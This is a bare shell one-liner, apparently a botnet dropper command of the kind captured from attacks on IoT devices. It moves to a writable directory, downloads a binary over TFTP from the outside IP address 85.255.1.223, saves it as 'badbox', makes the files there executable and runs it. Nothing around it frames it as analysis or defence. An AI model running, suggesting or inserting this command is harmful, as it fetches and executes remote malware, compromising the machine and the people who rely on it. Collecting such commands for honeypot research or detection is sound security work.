cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r bash -g 85.255.1.223;cat bash >badbox;chmod +x *;./badbox
